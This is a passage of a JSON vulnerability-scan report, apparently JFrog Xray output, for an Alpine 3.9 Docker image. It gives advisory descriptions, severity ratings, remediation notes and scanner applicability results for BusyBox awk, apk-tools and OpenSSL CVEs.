Development mitigations\\n\\nComment out `CONFIG_AWK=y` in Busybox's `.config` file and recompile\"\n            },\n            \"applicability\": [\n                {\n                    \"scanner_available\": true,\n                    \"component_id\": \"docker://alpine3.9:latest\",\n                    \"source_comp_id\": \"alpine://3.9:ssl_client:1.29.3-r10\",\n                    \"cve_id\": \"CVE-2021-42380\",\n                    \"scan_status\": 1,\n                    \"applicability\": false,\n                    \"evidence\": [\n                        {\n                            \"column_names\": [\n                                \"Path\",\n                                \"Evidence\",\n                                \"Line Number\",\n                                \"Issue Found\"\n                            ],\n                            \"rows\": [\n                                [\n                                    \"/bin/busybox\",\n                                    \"awk\",\n                                    \"4157\",\n                                    \"Busybox executable with awk applet was found\"\n                                ],\n                                [\n                                    \"/bin/busybox\",\n                                    \"awk\",\n                                    \"5205\",\n                                    \"Busybox executable with awk applet was found\"\n                                ]\n                            ]\n                        }\n                    ],\n                    \"info\": \"Vulnerable usage of awk was {not }found\",\n                    \"details\": [\n                        {\n                            \"file_path\": \"/bin/busybox\",\n                            \"details\": \"Evidence: awk, Line Number: 4157, Issue Found: Busybox executable with awk applet was found\"\n                        },\n                        {\n                            \"file_path\": \"/bin/busybox\",\n                            \"details\": \"Evidence: awk, Line Number: 5205, Issue Found: Busybox executable with awk applet was found\"\n                        }\n                    ]\n                },\n                {\n                    \"scanner_available\": true,\n                    \"component_id\": \"docker://alpine3.9:latest\",\n                    \"source_comp_id\": \"alpine://3.9:busybox:1.29.3-r10\",\n                    \"cve_id\": \"CVE-2021-42380\",\n                    \"scan_status\": 1,\n                    \"applicability\": false,\n                    \"evidence\": [\n                        {\n                            \"column_names\": [\n                                \"Path\",\n                                \"Evidence\",\n                                \"Line Number\",\n                                \"Issue Found\"\n                            ],\n                            \"rows\": [\n                                [\n                                    \"/bin/busybox\",\n                                    \"awk\",\n                                    \"4157\",\n                                    \"Busybox executable with awk applet was found\"\n                                ],\n                                [\n                                    \"/bin/busybox\",\n                                    \"awk\",\n                                    \"5205\",\n                                    \"Busybox executable with awk applet was found\"\n                                ]\n                            ]\n                        }\n                    ],\n                    \"info\": \"Vulnerable usage of awk was {not }found\",\n                    \"details\": [\n                        {\n                            \"file_path\": \"/bin/busybox\",\n                            \"details\": \"Evidence: awk, Line Number: 4157, Issue Found: Busybox executable with awk applet was found\"\n                        },\n                        {\n                            \"file_path\": \"/bin/busybox\",\n                            \"details\": \"Evidence: awk, Line Number: 5205, Issue Found: Busybox executable with awk applet was found\"\n                        }\n                    ]\n                }\n            ],\n            \"applicability_details\": [\n                {\n                    \"component_id\": \"docker://alpine3.9:latest\",\n                    \"source_comp_id\": \"alpine://3.9:ssl_client:1.29.3-r10\",\n                    \"vulnerability_id\": \"CVE-2021-42380\",\n                    \"result\": \"not_applicable\"\n                },\n                {\n                    \"component_id\": \"docker://alpine3.9:latest\",\n                    \"source_comp_id\": \"alpine://3.9:busybox:1.29.3-r10\",\n                    \"vulnerability_id\": \"CVE-2021-42380\",\n                    \"result\": \"not_applicable\"\n                }\n            ]\n        },\n        {\n            \"description\": \"In Alpine Linux apk-tools before 2.12.5, the tarball parser allows a buffer overflow and crash.\",\n            \"severity\": \"High\",\n            \"type\": \"Security\",\n            \"infected_components\": [\n                \"alpine://3.9:apk-tools:2.10.3-r1\"\n            ],\n            \"created\": \"2025-04-09T11:12:34Z\",\n            \"watch_name\": \"example1-watch\",\n            \"issue_id\": \"XRAY-173573\",\n            \"violation_details_url\": \"https://a0yluwjzcb37w.jfrog.io/xray/api/v1/violations?watch_id=9c2a89c47869ab6fda3f6013&issue_id=XRAY-173573&comp_id=docker:%2F%2Falpine3.9:latest\",\n            \"impacted_artifacts\": [\n                \"default/docker-local/alpine3.9/latest/\"\n            ],\n            \"component_physical_paths\": [\n                \"\"\n            ],\n            \"applicability_details\": [\n                {\n                    \"component_id\": \"docker://alpine3.9:latest\",\n                    \"source_comp_id\": \"\",\n                    \"vulnerability_id\": \"CVE-2021-30139\",\n                    \"result\": \"not_covered\"\n                }\n            ]\n        },\n        {\n            \"description\": \"The function PEM_read_bio_ex() reads a PEM file from a BIO and parses and\\ndecodes the \\\"name\\\" (e.g. \\\"CERTIFICATE\\\"), any header data and the payload data.\\nIf the function succeeds then the \\\"name_out\\\", \\\"header\\\" and \\\"data\\\" arguments are\\npopulated with pointers to buffers containing the relevant decoded data. The\\ncaller is responsible for freeing those buffers. It is possible to construct a\\nPEM file that results in 0 bytes of payload data. In this case PEM_read_bio_ex()\\nwill return a failure code but will populate the header argument with a pointer\\nto a buffer that has already been freed. If the caller also frees this buffer\\nthen a double free will occur. This will most likely lead to a crash. This\\ncould be exploited by an attacker who has the ability to supply malicious PEM\\nfiles for parsing to achieve a denial of service attack.\\n\\nThe functions PEM_read_bio() and PEM_read() are simple wrappers around\\nPEM_read_bio_ex() and therefore these functions are also directly affected.\\n\\nThese functions are also called indirectly by a number of other OpenSSL\\nfunctions including PEM_X509_INFO_read_bio_ex() and\\nSSL_CTX_use_serverinfo_file() which are also vulnerable. Some OpenSSL internal\\nuses of these functions are not vulnerable because the caller does not free the\\nheader argument if PEM_read_bio_ex() returns a failure code. These locations\\ninclude the PEM_read_bio_TYPE() functions as well as the decoders introduced in\\nOpenSSL 3.0.\\n\\nThe OpenSSL asn1parse command line application is also impacted by this issue.\",\n            \"severity\": \"High\",\n            \"type\": \"Security\",\n            \"infected_components\": [\n                \"alpine://3.9:libcrypto1.1:1.1.1g-r0\",\n                \"alpine://3.9:libssl1.1:1.1.1g-r0\"\n            ],\n            \"created\": \"2025-04-09T11:12:34Z\",\n            \"watch_name\": \"example1-watch\",\n            \"issue_id\": \"XRAY-607949\",\n            \"violation_details_url\": \"https://a0yluwjzcb37w.jfrog.io/xray/api/v1/violations?watch_id=9c2a89c47869ab6fda3f6013&issue_id=XRAY-607949&comp_id=docker:%2F%2Falpine3.9:latest\",\n            \"impacted_artifacts\": [\n                \"default/docker-local/alpine3.9/latest/\"\n            ],\n            \"component_physical_paths\": [\n                \"\",\n                \"\"\n            ],\n            \"applicability\": [\n                {\n                    \"scanner_available\": true,\n                    \"component_id\": \"docker://alpine3.9:latest\",\n                    \"source_comp_id\": \"alpine://3.9:libssl1.1:1.1.1g-r0\",\n                    \"cve_id\": \"CVE-2022-4450\",\n                    \"scan_status\": 1,\n                    \"applicability\": false,\n                    \"scanner_explanation\": \"<p>The scanner checks if at least one of the vulnerable functions is called:</p>\\n<pre><code>PEM_read_bio_ex()\\nPEM_read_bio()\\nPEM_read()\\nPEM_read_DHparams()\\nPEM_read_PrivateKey()\\nPEM_read_bio_PrivateKey()\\nPEM_read_RSA_PUBKEY()\\nPEM_read_bio_RSA_PUBKEY()\\nPEM_read_RSAPrivateKey()\\nPEM_read_bio_RSAPrivateKey()\\nPEM_read_PKCS7()\\nPEM_read_bio_PKCS7()\\nPEM_read_X509()\\nPEM_read_bio_X509()\\nPEM_read_X509_AUX()\\nPEM_read_bio_X509_AUX()\\nPEM_read_X509_CRL()\\nPEM_read_bio_X509_CRL()\\nPEM_read_bio_X509_REQ()\\nPEM_read_bio_ECPrivateKey()\\nPEM_read_bio_PKCS8()\\n\\nPEM_X509_INFO_read_bio_ex()\\nSSL_CTX_use_serverinfo_file()\\nSSL_use_cert_and_key() \\nSSL_CTX_use_certificate_chain_file()\\nSSL_CTX_load_verify_locations()\\nSSL_CTX_set1_verify_file()\\nSSL_CTX_set1_verify_path()\\nX509_LOOKUP_load_file()\\n\\nSSL_load_client_CA_file_ex()\\nSSL_load_client_CA_file()\\nSSL_add_file_cert_subjects_to_stack()\\nSSL_add_dir_cert_subjects_to_stack()\\nSSL_add_store_cert_subjects_to_stack()\\n\\nuse_certificate_chain_file\\nSSL_use_certificate_file\\nSSL_CTX_use_certificate_file\\nSSL_use_PrivateKey_file\\nSSL_CTX_use_PrivateKey_file\\nSSL_CTX_use_serverinfo_file\\n\\nSSL_use_RSAPrivateKey_file\\nSSL_CTX_use_RSAPrivateKey_file\\n</code></pre>\\n<p>Note that while the vulnerability is also exploitable through the use of the command line tool <code>openssl asn1parse</code>, the vulnerability's DoS impact in this case does not pose a threat, since the DoS will crash the forked <code>openssl</code> tool process only</p>\",\n                    \"evidence\": null,\n                    \"info\": \"No references to the vulnerable function were found\",\n                    \"details\": null\n                },\n                {\n                    \"scanner_available\": true,\n                    \"component_id\": \"docker://alpine3.9:latest\",\n                    \"source_comp_id\": \"alpine://3.9:libcrypto1.1:1.1.1g-r0\",\n                    \"cve_id\": \"CVE-2022-4450\",\n                    \"scan_status\": 1,\n                    \"applicability\": false,\n                    \"scanner_explanation\": \"<p>The scanner checks if at least one of the vulnerable functions is called:</p>\\n<pre><code>PEM_read_bio_ex()\\nPEM_read_bio()\\nPEM_read()\\nPEM_read_DHparams()\\nPEM_read_PrivateKey()\\nPEM_read_bio_PrivateKey()\\nPEM_read_RSA_PUBKEY()\\nPEM_read_bio_RSA_PUBKEY()\\nPEM_read_RSAPrivateKey()\\nPEM_read_bio_RSAPrivateKey()\\nPEM_read_PKCS7()\\nPEM_read_bio_PKCS7()\\nPEM_read_X509()\\nPEM_read_bio_X509()\\nPEM_read_X509_AUX()\\nPEM_read_bio_X509_AUX()\\nPEM_read_X509_CRL()\\nPEM_read_bio_X509_CRL()\\nPEM_read_bio_X509_REQ()\\nPEM_read_bio_ECPrivateKey()\\nPEM_read_bio_PKCS8()\\n\\nPEM_X509_INFO_read_bio_ex()\\nSSL_CTX_use_serverinfo_file()\\nSSL_use_cert_and_key() \\nSSL_CTX_use_certificate_chain_file()\\nSSL_CTX_load_verify_locations()\\nSSL_CTX_set1_verify_file()\\nSSL_CTX_set1_verify_path()\\nX509_LOOKUP_load_file()\\n\\nSSL_load_client_CA_file_ex()\\nSSL_load_client_CA_file()\\nSSL_add_file_cert_subjects_to_stack()\\nSSL_add_dir_cert_subjects_to_stack()\\nSSL_add_store_cert_subjects_to_stack()\\n\\nuse_certificate_chain_file\\nSSL_use_certificate_file\\nSSL_CTX_use_certificate_file\\nSSL_use_PrivateKey_file\\nSSL_CTX_use_PrivateKey_file\\nSSL_CTX_use_serverinfo_file\\n\\nSSL_use_RSAPrivateKey_file\\nSSL_CTX_use_RSAPrivateKey_file\\n</code></pre>\\n<p>Note that while the vulnerability is also exploitable through the use of the command line tool <code>openssl asn1parse</code>, the vulnerability's DoS impact in this case does not pose a threat, since the DoS will crash the forked <code>openssl</code> tool process only</p>\",\n                    \"evidence\": null,\n                    \"info\": \"No references to the vulnerable function were found\",\n                    \"details\": null\n                }\n            ],\n            \"applicability_details\": [\n                {\n                    \"component_id\": \"docker://alpine3.9:latest\",\n                    \"source_comp_id\": \"alpine://3.9:libssl1.1:1.1.1g-r0\",\n                    \"vulnerability_id\": \"CVE-2022-4450\",\n                    \"result\": \"not_applicable\"\n                },\n                {\n                    \"component_id\": \"docker://alpine3.9:latest\",\n                    \"source_comp_id\": \"alpine://3.9:libcrypto1.1:1.1.1g-r0\",\n                    \"vulnerability_id\": \"CVE-2022-4450\",\n                    \"result\": \"not_applicable\"\n                }\n            ]\n        },\n        {\n            \"description\": \"An invalid pointer dereference on read can be triggered when an\\napplication tries to check a malformed DSA public key by the\\nEVP_PKEY_public_check() function. This will most likely lead\\nto an application crash. This function can be called on public\\nkeys supplied from untrusted sources which could allow an attacker\\nto cause a denial of service attack.\\n\\nThe TLS implementation in OpenSSL does not call this function\\nbut applications might call the function if there are additional\\nsecurity requirements imposed by standards such as FIPS 140-3.\",\n            \"severity\": \"High\",\n            \"type\": \"Security\",\n            \"infected_components\": [\n                \"alpine://3.9:libcrypto1.1:1.1.1g-r0\",\n                \"alpine://3.9:libssl1.1:1.1.1g-r0\"\n            ],\n            \"created\": \"2025-04-09T11:12:34Z\",\n            \"watch_name\": \"example1-watch\",\n            \"issue_id\": \"XRAY-607992\",\n            \"violation_details_url\": \"https://a0yluwjzcb37w.jfrog.io/xray/api/v1/violations?watch_id=9c2a89c47869ab6fda3f6013&issue_id=XRAY-607992&comp_id=docker:%2F%2Falpine3.9:latest\",\n            \"impacted_artifacts\": [\n                \"default/docker-local/alpine3.9/latest/\"\n            ],\n            \"component_physical_paths\": [\n                \"\",\n                \"\"\n            ],\n            \"applicability\": [\n                {\n                    \"scanner_available\": true,\n                    \"component_id\": \"docker://alpine3.9:latest\",\n                    \"source_comp_id\": \"alpine://3.9:libssl1.1:1.1.1g-r0\",\n                    \"cve_id\": \"CVE-2023-0217\",\n                    \"scan_status\": 1,\n                    \"applicability\": false,\n                    \"scanner_explanation\": \"<p>When checking ELF files, the scanner checks whether the vulnerable <code>EVP_PKEY_public_check()</code> function is called.</p>\\n<p>Note that the CVE is never applicable in Python, since the vulnerable functions cannot be externally invoked</p>\",\n                    \"evidence\": null,\n                    \"info\": \"The vulnerable function `EVP_PKEY_public_check` is never called\",\n                    \"details\": null\n                },\n                {\n                    \"scanner_available\": true,\n                    \"component_id\": \"docker://alpine3.9:latest\",\n                    \"source_comp_id\": \"alpine://3.9:libcrypto1.1:1.1.1g-r0\",\n                    \"cve_id\": \"CVE-2023-0217\",\n                    \"scan_status\": 1,\n                    \"applicability\": false,\n                    \"scanner_explanation\": \"<p>When checking ELF files, the scanner checks whether the vulnerable <code>EVP_PKEY_public_check()</code> function is called.</p>\\n<p>Note that the CVE is never applicable in Python, since the vulnerable functions cannot be externally invoked</p>\",\n                    \"evidence\": null,\n                    \"info\": \"The vulnerable function `EVP_PKEY_public_check` is never called\",\n                    \"details\": null\n                }\n            ],\n            \"applicability_details\": [\n                {\n                    \"component_id\": \"docker://alpine3.9:latest\",\n                    \"source_comp_id\": \"alpine://3.9:libssl1.1:1.1.1g-r0\",\n                    \"vulnerability_id\": \"CVE-2023-0217\",\n                    \"result\": \"not_applicable\"\n                },\n                {\n                    \"component_id\": \"docker://alpine3.9:latest\",\n                    \"source_comp_id\": \"alpine://3.9:libcrypto1.1:1.1.1g-r0\",\n                    \"vulnerability_id\": \"CVE-2023-0217\",\n                    \"result\": \"not_applicable\"\n                }\n            ]\n        },\n        {\n            \"description\": \"The openssl gem for Ruby uses the same initialization vector (IV) in GCM Mode (aes-*-gcm) when the IV is set before the key, which makes it easier for context-dependent attackers to bypass the encryption protection mechanism.\",\n            \"severity\": \"High\",\n            \"type\": \"Security\",\n            \"infected_components\": [\n                \"alpine://3.9:libssl1.1:1.1.1g-r0\",\n                \"alpine://3.9:libcrypto1.1:1.1.1g-r0\"\n            ],\n            \"created\": \"2025-04-09T11:12:34Z\",\n            \"watch_name\": \"example1-watch\",\n            \"issue_id\": \"XRAY-522768\",\n            \"violation_details_url\": \"https://a0yluwjzcb37w.jfrog.io/xray/api/v1/violations?watch_id=9c2a89c47869ab6fda3f6013&issue_id=XRAY-522768&comp_id=docker:%2F%2Falpine3.9:latest\",\n            \"impacted_artifacts\": [\n                \"default/docker-local/alpine3.9/latest/\"\n            ],\n            \"component_physical_paths\": [\n                \"\",\n                \"\"\n            ],\n            \"applicability\": [\n                {\n                    \"scanner_available\": true,\n                    \"component_id\": \"docker://alpine3.9:latest\",\n                    \"source_comp_id\": \"alpine://3.9:libssl1.1:1.1.1g-r0\",\n                    \"cve_id\": \"CVE-2016-7798\",\n                    \"scan_status\": 1,\n                    \"applicability\": false,\n                    \"scanner_explanation\": \"<p>The scanner checks if the function <code>OpenSSL::Cipher.new()</code> is called with AES gcm is as the encryption type. <br />\\nFor determining the applicability of this CVE, an additional condition (that the scanner currently does not check) should be verified: The AES IV initialization happens before the key initialization.</p>\",\n                    \"evidence\": null,\n                    \"info\": \"Vulnerable AES gcm encryption is not set\",\n                    \"details\": null\n                },\n                {\n                    \"scanner_available\": true,\n                    \"component_id\": \"docker://alpine3.9:latest\",\n                    \"source_comp_id\": \"alpine://3.9:libcrypto1.1:1.1.1g-r0\",\n                    \"cve_id\": \"CVE-2016-7798\",\n                    \"scan_status\": 1,\n                    \"applicability\": false,\n                    \"scanner_explanation\": \"<p>The scanner checks if the function <code>OpenSSL::Cipher.new()</code> is called with AES gcm is as the encryption type. <br />\\nFor determining the applicability of this CVE, an additional condition (that the scanner currently does not check) should be verified: The AES IV initialization happens before the key initialization.</p>\",\n                    \"evidence\": null,\n                    \"info\": \"Vulnerable AES gcm encryption is not set\",\n                    \"details\": null\n                }\n            ],\n            \"applicability_details\": [\n                {\n                    \"component_id\": \"docker://alpine3.9:latest\",\n                    \"source_comp_id\": \"alpine://3.9:libssl1.1:1.1.1g-r0\",\n                    \"vulnerability_id\": \"CVE-2016-7798\",\n                    \"result\": \"not_applicable\"\n                },\n                {\n                    \"component_id\": \"docker://alpine3.9:latest\",\n                    \"source_comp_id\": \"alpine://3.9:libcrypto1.1:1.1.1g-r0\",\n                    \"vulnerability_id\": \"CVE-2016-7798\",\n                    \"result\": \"not_applicable\"\n                }\n            ]\n        },\n        {\n            \"description\": \"There is a type confusion vulnerability relating to X.400 address processing\\ninside an X.509 GeneralName. X.400 addresses were parsed as an ASN1_STRING but\\nthe public structure definition for GENERAL_NAME incorrectly specified the type\\nof the x400Address field as ASN1_TYPE. This field is subsequently interpreted by\\nthe OpenSSL function GENERAL_NAME_cmp as an ASN1_TYPE rather than an\\nASN1_STRING.\\n\\nWhen CRL checking is enabled (i.e. the application sets the\\nX509_V_FLAG_CRL_CHECK flag), this vulnerability may allow an attacker to pass\\narbitrary pointers to a memcmp call, enabling them to read memory contents or\\nenact a denial of service. In most cases, the attack requires the attacker to\\nprovide both the certificate chain and CRL, neither of which need to have a\\nvalid signature. If the attacker only controls one of these inputs, the other\\ninput must already contain an X.400 address as a CRL distribution point, which\\nis uncommon. As such, this vulnerability is most likely to only affect\\napplications which have implemented their own functionality for retrieving CRLs\\nover a network.\",\n            \"severity\": \"High\",\n            \"type\": \"Security\",\n            \"infected_components\": [\n                \"alpine://3.9:libssl1.1:1.1.1g-r0\",\n                \"alpine://3.9:libcrypto1.1:1.1.1g-r0\"\n            ],\n            \"created\": \"2025-04-09T11:12:34Z\",\n            \"watch_name\": \"example1-watch\",\n            \"issue_id\": \"XRAY-607950\",\n            \"violation_details_url\": \"https://a0yluwjzcb37w.jfrog.io/xray/api/v1/violations?watch_id=9c2a89c47869ab6fda3f6013&issue_id=XRAY-607950&comp_id=docker:%2F%2Falpine3.9:latest\",\n            \"impacted_artifacts\": [\n                \"default/docker-local/alpine3.9/latest/\"\n            ],\n            \"component_physical_paths\": [\n                \"\",\n                \"\"\n            ],\n            \"applicability\": [\n                {\n                    \"scanner_available\": true,\n                    \"component_id\": \"docker://alpine3.9:latest\",\n                    \"source_comp_id\": \"alpine://3.9:libssl1.1:1.1.1g-r0\",\n                    \"cve_id\": \"CVE-2023-0286\",\n                    \"scan_status\": 1,\n                    \"applicability\": false,\n                    \"scanner_explanation\": \"<p>The scanner checks if at least one of the vulnerable API calls is called:</p>\\n<ul>\\n<li><code>X509_STORE_CTX_get_check_revocation</code></li>\\n<li><code>X509_STORE_get_check_revocation</code></li>\\n</ul>\\n<p>For determining the applicability of this CVE, an additional condition (that the scanner currently does not check) should be verified: The CRL checking option must also be enabled.</p>\",\n                    \"evidence\": null,\n                    \"info\": \"No references to the vulnerable function were found\",\n                    \"details\": null\n                },\n                {\n                    \"scanner_available\": true,\n                    \"component_id\": \"docker://alpine3.9:latest\",\n                    \"source_comp_id\": \"alpine://3.9:libcrypto1.1:1.1.1g-r0\",\n                    \"cve_id\": \"CVE-2023-0286\",\n                    \"scan_status\": 1,\n                    \"applicability\": false,\n                    \"scanner_explanation\": \"<p>The scanner checks if at least one of the vulnerable API calls is called:</p>\\n<ul>\\n<li><code>X509_STORE_CTX_get_check_revocation</code></li>\\n<li><code>X509_STORE_get_check_revocation</code></li>\\n</ul>\\n<p>For determining the applicability of this CVE, an additional condition (that the scanner currently does not check) should be verified: The CRL checking option must also be enabled.</p>\",\n                    \"evidence\": null,\n                    \"info\": \"No references to the vulnerable function were found\",\n                    \"details\": null\n                }\n            ],\n            \"applicability_details\": [\n                {\n                    \"component_id\": \"docker://alpine3.9:latest\",\n                    \"source_comp_id\": \"alpine://3.9:libssl1.1:1.1.1g-r0\",\n                    \"vulnerability_id\": \"CVE-2023-0286\",\n                    \"result\": \"not_applicable\"\n                },\n                {\n                    \"component_id\": \"docker://alpine3.9:latest\",\n                    \"source_comp_id\": \"alpine://3.9:libcrypto1.1:1.1.1g-r0\",\n                    \"vulnerability_id\": \"CVE-2023-0286\",\n                    \"result\": \"not_applicable\"\n                }\n            ]\n        },\n        {\n            \"description\": \"A use-after-free in Busybox's awk applet leads to denial of service and possibly code execution when processing a crafted awk pattern in the nvalloc function\",\n            \"severity\": \"High\",\n            \"type\": \"Security\",\n            \"infected_components\": [\n                \"alpine://3.9:busybox:1.29.3-r10\",\n                \"alpine://3.9:ssl_client:1.29.3-r10\"\n            ],\n            \"created\": \"2025-04-09T11:12:34Z\",\n            \"watch_name\": \"example1-watch\",\n            \"issue_id\": \"XRAY-190218\",\n            \"violation_details_url\": \"https://a0yluwjzcb37w.jfrog.io/xray/api/v1/violations?watch_id=9c2a89c47869ab6fda3f6013&issue_id=XRAY-190218&comp_id=docker:%2F%2Falpine3.9:latest\",\n            \"impacted_artifacts\": [\n                \"default/docker-local/alpine3.9/latest/\"\n            ],\n            \"component_physical_paths\": [\n                \"\",\n                \"\"\n            ],\n            \"extended_information\": {\n                \"short_description\": \"A use-after-free in Busybox awk leads to remote code execution when processing malformed command line arguments.\",\n                \"full_description\": \"The [BusyBox](https://busybox.net/) toolkit implements a large number of Linux tools in a single executable and can even replace the Linux init system. Its small size and flexibility make it popular in embedded devices.\\n\\nA use-after-free in awk leads to denial of service and possibly code execution when processing a crafted awk pattern in the `nvalloc` function.\\nAn attacker that controls the `awk` pattern (through the command line argument) can trigger this issue.\",\n                \"jfrog_research_severity\": \"Medium\",\n                \"jfrog_research_severity_reasons\": [\n                    {\n                        \"name\": \"The issue cannot result in a severe impact (such as remote code execution)\",\n                        \"description\": \"Full control of the `awk` pattern usually leads to RCE, without needing to exploit this UAF. The issue is mostly relevant if the attacker can control the pattern, but it is filtered before being passed to `awk`.\",\n                        \"is_positive\": true\n                    },\n                    {\n                        \"name\": \"The prerequisites for exploiting the issue are extremely unlikely\",\n                        \"description\": \"The applet must accept arbitrary command line arguments from an external source\",\n                        \"is_positive\": true\n                    },\n                    {\n                        \"name\": \"Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector\",\n                        \"description\": \"The attacker would need to determine which external input propagates into the applet's command line arguments\",\n                        \"is_positive\": true\n                    }\n                ],\n                \"remediation\": \"##### Development mitigations\\n\\nComment out `CONFIG_AWK=y` in Busybox's `.config` file and recompile\"\n            },\n            \"applicability\": [\n                {\n                    \"scanner_available\": true,\n                    \"component_id\": \"docker://alpine3.9:latest\",\n                    \"source_comp_id\": \"alpine://3.9:ssl_client:1.29.3-r10\",\n                    \"cve_id\": \"CVE-2021-42386\",\n                    \"scan_status\": 1,\n                    \"applicability\": false,\n                    \"evidence\": [\n                        {\n                            \"column_names\": [\n                                \"Path\",\n                                \"Evidence\",\n                                \"Line Number\",\n                                \"Issue Found\"\n                            ],\n                            \"rows\": [\n                                [\n                                    \"/bin/busybox\",\n                                    \"awk\",\n                                    \"4157\",\n                                    \"Busybox executable with awk applet was found\"\n                                ],\n                                [\n                                    \"/bin/busybox\",\n                                    \"awk\",\n                                    \"5205\",\n                                    \"Busybox executable with awk applet was found\"\n                                ]\n                            ]\n                        }\n                    ],\n                    \"info\": \"Vulnerable usage of awk was {not }found\",\n                    \"details\": [\n                        {\n                            \"file_path\": \"/bin/busybox\",\n                            \"details\": \"Evidence: awk, Line Number: 4157, Issue Found: Busybox executable with awk applet was found\"\n                        },\n                        {\n                            \"file_path\": \"/bin/busybox\",\n                            \"details\": \"Evidence: awk, Line Number: 5205, Issue Found: Busybox executable with awk applet was found\"\n                        }\n                    ]\n                },\n                {\n                    \"scanner_available\": true,\n                    \"component_id\": \"docker://alpine3.9:latest\",\n                    \"source_comp_id\": \"alpine://3.9:busybox:1.29.3-r10\",\n                    \"cve_id\": \"CVE-2021-42386\",\n                    \"scan_status\": 1,\n                    \"applicability\": false,\n                    \"evidence\": [\n                        {\n                            \"column_names\": [\n                                \"Path\",\n                                \"Evidence\",\n                                \"Line Number\",\n                                \"Issue Found\"\n                            ],\n                            \"rows\": [\n                                [\n                                    \"/bin/busybox\",\n                                    \"awk\",\n                                    \"4157\",\n                                    \"Busybox executable with awk applet was found\"\n                                ],\n                                [\n                                    \"/bin/busybox\",\n                                    \"awk\",\n                                    \"5205\",\n                                    \"Busybox executable with awk applet was found\"\n                                ]\n                            ]\n                        }\n                    ],\n                    \"info\": \"Vulnerable usage of awk was {not }found\",\n                    \"details\": [\n                        {\n                            \"file_path\": \"/bin/busybox\",\n                            \"details\": \"Evidence: awk, Line Number: 4157, Issue Found: Busybox executable with awk applet was found\"\n                        },\n                        {\n                            \"file_path\": \"/bin/busybox\",\n                            \"details\": \"Evidence: awk, Line Number: 5205, Issue Found: Busybox executable with awk applet was found\"\n                        }\n                    ]\n                }\n            ],\n            \"applicability_details\": [\n                {\n                    \"component_id\": \"docker://alpine3.9:latest\",\n                    \"source_comp_id\": \"alpine://3.9:ssl_client:1.29.3-r10\",\n                    \"vulnerability_id\": \"CVE-2021-42386\",\n                    \"result\": \"not_applicable\"\n                },\n                {\n                    \"component_id\": \"docker://alpine3.9:latest\",\n                    \"source_comp_id\": \"alpine://3.9:busybox:1.29.3-r10\",\n                    \"vulnerability_id\": \"CVE-2021-42386\",\n                    \"result\": \"not_applicable\"\n                }\n            ]\n        },\n        {\n            \"description\": \"Issue summary: A bug has been identified in the processing of key and\\ninitialisation vector (IV) lengths.  This can lead to potential truncation\\nor overruns during the initialisation of some symmetric ciphers.\\n\\nImpact summary: A truncation in the IV can result in non-uniqueness,\\nwhich could result in loss of confidentiality for some cipher modes.\\n\\nWhen calling EVP_EncryptInit_ex2(), EVP_DecryptInit_ex2() or\\nEVP_CipherInit_ex2() the provided OSSL_PARAM array is processed after\\nthe key and IV have been established.  Any alterations to the key length,\\nvia the \\\"keylen\\\" parameter or the IV length, via the \\\"ivlen\\\" parameter,\\nwithin the OSSL_PARAM array will not take effect as intended, potentially\\ncausing truncation or overreading of these values.  The following ciphers\\nand cipher modes are impacted: RC2, RC4, RC5, CCM, GCM and OCB.\\n\\nFor the CCM, GCM and OCB cipher modes, truncation of the IV can result in\\nloss of confidentiality.  For example, when following NIST's SP 800-38D\\nsection 8.2.1 guidance for constructing a deterministic IV for AES in\\nGCM mode, truncation of the counter portion could lead to IV reuse.\\n\\nBoth truncations and overruns of the key and overruns of the IV will\\nproduce incorrect results and could, in some cases, trigger a memory\\nexception.  However, these issues are not currently assessed as security\\ncritical.\\n\\nChanging the key and/or IV lengths is not considered to be a common operation\\nand the vulnerable API was recently introduced. Furthermore it is likely that\\napplication developers will have spotted this problem during testing since\\ndecryption would fail unless both peers in the communication were similarly\\nvulnerable. For these reasons we expect the probability of an application being\\nvulnerable to this to be quite low. However if an application is vulnerable then\\nthis issue is considered very serious. For these reasons we have assessed this\\nissue as Moderate severity overall.\\n\\nThe OpenSSL SSL/TLS implementation is not affected by this issue.\\n\\nThe OpenSSL 3.0 and 3.1 FIPS providers are...\",\n            \"severity\": \"High\",\n            \"type\": \"Security\",\n            \"infected_components\": [\n                \"alpine://3.9:libcrypto1.1:1.1.1g-r0\",\n                \"alpine://3.9:libssl1.1:1.1.1g-r0\"\n            ],\n            \"created\": \"2025-04-09T11:12:34Z\",\n            \"watch_name\": \"example1-watch\",\n            \"issue_id\": \"XRAY-534478\",\n            \"violation_details_url\": \"https://a0yluwjzcb37w.jfrog.io/xray/api/v1/violations?watch_id=9c2a89c47869ab6fda3f6013&issue_id=XRAY-534478&comp_id=docker:%2F%2Falpine3.9:latest\",\n            \"impacted_artifacts\": [\n                \"default/docker-local/alpine3.9/latest/\"\n            ],\n            \"component_physical_paths\": [\n                \"\",\n                \"\"\n            ],\n            \"extended_information\": {\n                \"short_description\": \"A design problem in OpenSSL 3.x may lead to data leakage when processing cipher parameters.\",\n                \"full_description\": \"OpenSSL is an open-source cryptographic library and toolset that provides a wide range of protocol supported and functions for secure communication, data encryption, digital certificates, and other cryptographic operations, widely used in various software applications and systems.\\nIn cryptography, a block cipher is a symmetric key algorithm that encrypts fixed-size blocks of data, typically 64 or 128 bits, transforming each block into a corresponding ciphertext block using a key-specific permutation.\\n\\nA major problem with block ciphers, is that equal plaintext blocks get transformed to equal ciphertexts. This can be used for a known-plaintext attack, where an adversary possesses both the plaintext and its corresponding encrypted form, aiming to deduce the encryption key or gain insights into the encryption algorithm.\\n\\nTo counter this, we use an Initialization vector (IV), which is a random or unique input to a cryptographic algorithm used to alter the first block of the cipher, ensuring equal plaintext blocks won’t be transformed to equal ciphertexts.\\n\\nA vulnerability was found in OpenSSL 3.x, in certain situations, parameters such as key length or IV length, will be processed after the key and IV have been established, hence they will not take effect as intended, potentially causing truncation or overreading of these values, impacting the confidentiality of the encryption.\\n\\nWhen calling the functions `EVP_CipherInit_ex2`, `EVP_EncryptInit_ex2, or `EVP_DecryptInit_ex2` with an `OSSL_PARAM` array, changes to the `keylen` or `ivlen` parameters will only be processed after the IV and the key have been established.\\n\\nNote this impacts the following ciphers: RC2, RC4, RC5, and the following cipher modes: CCM, GCM, OCB.\",\n                \"jfrog_research_severity\": \"Medium\",\n                \"jfrog_research_severity_reasons\": [\n                    {\n                        \"name\": \"Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector\",\n                        \"description\": \"The vulnerability is only applicable if the vulnerable functions `EVP_CipherInit_ex2`, 